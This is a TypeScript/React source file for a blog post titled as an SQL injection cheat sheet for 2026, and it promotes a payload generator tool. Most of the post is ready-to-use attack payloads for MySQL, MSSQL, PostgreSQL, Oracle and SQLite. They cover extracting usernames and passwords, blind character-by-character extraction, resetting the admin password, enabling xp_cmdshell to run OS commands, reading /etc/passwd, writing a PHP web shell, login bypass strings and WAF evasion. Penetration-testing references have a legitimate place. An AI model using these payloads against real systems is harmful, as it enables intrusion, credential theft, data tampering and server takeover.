import type { BlogPost } from "@/lib/blog";

export const meta: BlogPost = {
  slug: "sql-injection-cheat-sheet",
  title: "SQL Injection Cheat Sheet 2026 — Payloads for MySQL, MSSQL, PostgreSQL, Oracle, and SQLite",
  description:
    "Complete SQL injection cheat sheet for pentesters and bug bounty hunters. Covers UNION, blind, error-based, and stacked query injection with database-specific payloads, WAF bypass techniques, and authentication bypass methods.",
  date: "2026-03-22",
  author: "4252nez",
  keywords: [
    "SQL injection cheat sheet",
    "SQLi payloads",
    "SQL injection pentest",
    "UNION SQL injection",
    "blind SQL injection",
    "error based SQL injection",
    "SQL injection bypass",
    "SQL injection authentication bypass",
    "SQLi WAF bypass",
  ],
  relatedTool: "sqli",
};

export function Content() {
  return (
    <>
      <p>
        SQL injection remains one of the most impactful web vulnerabilities. The
        key to successful exploitation is matching your payloads to the target
        database engine, injection context, and injection type. This cheat sheet
        covers every technique you need, organized by database and attack type.
      </p>
      <p>
        Use our <a href="/tools/sqli">SQL Injection Payload Generator</a> to
        automatically generate context-aware payloads with WAF bypass options, or
        keep reading for the full reference.
      </p>

      <h2>Injection Contexts</h2>
      <p>
        Before crafting payloads, determine how your input is embedded in the SQL
        query. The context dictates the breakout characters needed.
      </p>
      <table>
        <thead>
          <tr>
            <th>Context</th>
            <th>SQL Example</th>
            <th>Breakout</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>Numeric</td>
            <td>WHERE id = INJECT</td>
            <td>No quotes needed</td>
          </tr>
          <tr>
            <td>Single-quoted string</td>
            <td>{"WHERE name = 'INJECT'"}</td>
            <td>Close with single quote</td>
          </tr>
          <tr>
            <td>Double-quoted string</td>
            <td>{'WHERE name = "INJECT"'}</td>
            <td>Close with double quote</td>
          </tr>
        </tbody>
      </table>

      <h2>Comment Styles by Database</h2>
      <p>
        After injecting your payload, you typically need to comment out the rest
        of the original query to avoid syntax errors.
      </p>
      <table>
        <thead>
          <tr>
            <th>Comment</th>
            <th>Supported DBs</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>{"--"}</td>
            <td>MySQL, MSSQL, PostgreSQL, Oracle, SQLite</td>
          </tr>
          <tr>
            <td>{"-- -"}</td>
            <td>MySQL (dash-space-dash)</td>
          </tr>
          <tr>
            <td>#</td>
            <td>MySQL</td>
          </tr>
          <tr>
            <td>{"/* */"}</td>
            <td>All databases (block comment)</td>
          </tr>
        </tbody>
      </table>

      <h2>UNION-based Injection</h2>
      <p>
        UNION injection appends a second SELECT statement to extract data from
        other tables. The injected UNION SELECT must have the same number of
        columns as the original query.
      </p>

      <h3>Step 1: Determine Column Count</h3>
      <pre>
        <code>{`# ORDER BY method — increment until error
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    <-- error here means 2 columns

# UNION NULL method — add NULLs until success
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--`}</code>
      </pre>

      <h3>Step 2: Extract Data</h3>
      <pre>
        <code>{`# MySQL
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT user(),NULL,NULL--
' UNION SELECT database(),NULL,NULL--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT CONCAT(username,0x3a,password),NULL,NULL FROM users--

# MSSQL
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT SYSTEM_USER,NULL,NULL--
' UNION SELECT DB_NAME(),NULL,NULL--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

# PostgreSQL
' UNION SELECT version(),NULL,NULL--
' UNION SELECT current_user,NULL,NULL--
' UNION SELECT current_database(),NULL,NULL--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--

# Oracle (requires FROM dual)
' UNION SELECT banner,NULL,NULL FROM v$version--
' UNION SELECT USER,NULL,NULL FROM dual--
' UNION SELECT table_name,NULL,NULL FROM all_tables--

# SQLite
' UNION SELECT sqlite_version(),NULL,NULL--
' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'--`}</code>
      </pre>

      <h2>Boolean Blind Injection</h2>
      <p>
        When the application does not display query results or errors, you can
        infer data by observing how the response changes between true and false
        conditions.
      </p>
      <pre>
        <code>{`# Confirm injection — compare responses
' AND 1=1--    (true — normal response)
' AND 1=2--    (false — different response)

# Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='b'--

# Binary search with ASCII comparison (faster)
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>112--

# Determine data length
' AND LENGTH((SELECT password FROM users LIMIT 1))>0--
' AND LENGTH((SELECT password FROM users LIMIT 1))>10--`}</code>
      </pre>

      <h2>Time-based Blind Injection</h2>
      <p>
        When the application response is completely identical for true and false
        conditions, you can use time delays to infer data.
      </p>
      <pre>
        <code>{`# MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--

# Alternative: BENCHMARK (when SLEEP is blocked)
' AND BENCHMARK(10000000,SHA1('test'))--

# MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF(1=1) WAITFOR DELAY '0:0:5'--

# PostgreSQL
' AND pg_sleep(5)--
' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END--

# Oracle
' AND DBMS_LOCK.SLEEP(5)--

# SQLite (no sleep function — use heavy computation)
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--`}</code>
      </pre>

      <h2>Error-based Injection</h2>
      <p>
        Error-based injection extracts data from database error messages. This
        requires the application to display detailed error information.
      </p>
      <pre>
        <code>{`# MySQL — EXTRACTVALUE
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--

# MySQL — UPDATEXML
' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--

# MySQL — Double Query
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

# MSSQL — CONVERT
' AND 1=CONVERT(int,(SELECT @@version))--

# MSSQL — CAST
' AND 1=CAST((SELECT @@version) AS int)--

# PostgreSQL — CAST
' AND 1=CAST((SELECT version()) AS int)--

# Oracle — UTL_INADDR
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--

# Oracle — CTXSYS
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--`}</code>
      </pre>

      <h2>Stacked Queries</h2>
      <p>
        Stacked queries allow executing entirely new SQL statements after the
        original query. Not all database drivers support this. MSSQL and
        PostgreSQL commonly do; MySQL with PDO may support it.
      </p>
      <pre>
        <code>{`# Insert data
'; INSERT INTO users(username,password) VALUES('hacker','pwned')--

# Update data
'; UPDATE users SET password='hacked' WHERE username='admin'--

# MSSQL: Enable and use xp_cmdshell for OS commands
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
'; EXEC xp_cmdshell 'whoami'--

# MSSQL: Create login
'; CREATE LOGIN hacker WITH PASSWORD='P@ssw0rd!'--

# PostgreSQL: Read files
'; CREATE TABLE leak(content TEXT); COPY leak FROM '/etc/passwd'--

# PostgreSQL: OS commands
'; COPY (SELECT '') TO PROGRAM 'whoami'--

# MySQL: Write web shell
'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--`}</code>
      </pre>

      <h2>Authentication Bypass</h2>
      <p>
        Classic SQL injection payloads for bypassing login forms. These
        manipulate the WHERE clause to always evaluate as true.
      </p>
      <pre>
        <code>{`' OR 1=1--
' OR '1'='1
" OR 1=1--
admin'--
admin' OR '1'='1
' OR 1=1#
' UNION SELECT 1,'admin','password'--
') OR ('1'='1`}</code>
      </pre>

      <h2>WAF Bypass Techniques</h2>
      <p>
        Web Application Firewalls use pattern matching to block SQL injection. These
        techniques exploit parser differences between the WAF and the database.
      </p>

      <h3>Case Swapping</h3>
      <pre>
        <code>{`SeLeCt instead of SELECT
UnIoN SeLeCt instead of UNION SELECT
' oR 1=1--`}</code>
      </pre>

      <h3>Inline Comments</h3>
      <pre>
        <code>{`UN/**/ION SEL/**/ECT
' UN/**/ION/**/SEL/**/ECT/**/@@version--
/*!UNION*/ /*!SELECT*/ 1,2,3`}</code>
      </pre>

      <h3>URL Encoding</h3>
      <pre>
        <code>{`%27%20OR%201=1--     (' OR 1=1--)
%27%20UNION%20SELECT  (' UNION SELECT)

# Double URL encoding
%2527%2520OR%25201=1--`}</code>
      </pre>

      <h3>Whitespace Alternatives</h3>
      <pre>
        <code>{`# Use tabs instead of spaces
'	UNION	SELECT	@@version--

# Use newlines
'
UNION
SELECT
@@version--`}</code>
      </pre>

      <h2>Testing Methodology</h2>
      <p>
        A systematic approach to finding and exploiting SQL injection:
      </p>
      <ol>
        <li><strong>Identify input points</strong> — test every parameter (GET, POST, cookies, headers) with single quotes and observe behavior</li>
        <li><strong>Determine the context</strong> — is the input numeric, single-quoted, or double-quoted?</li>
        <li><strong>Identify the database</strong> — use version functions or error messages to determine MySQL, MSSQL, PostgreSQL, Oracle, or SQLite</li>
        <li><strong>Choose injection type</strong> — UNION if results are visible, error-based if errors are shown, blind if neither</li>
        <li><strong>Extract data</strong> — enumerate tables, columns, then extract the target data</li>
        <li><strong>Escalate</strong> — attempt stacked queries for data modification, file read/write, or OS command execution</li>
      </ol>

      <p>
        For hands-on payload generation with all these techniques built in, try our{" "}
        <a href="/tools/sqli">SQL Injection Payload Generator</a>. Select your
        database type, injection type, and context to generate tailored payloads
        with WAF bypass options — all in your browser with nothing sent to any server.
      </p>
    </>
  );
}
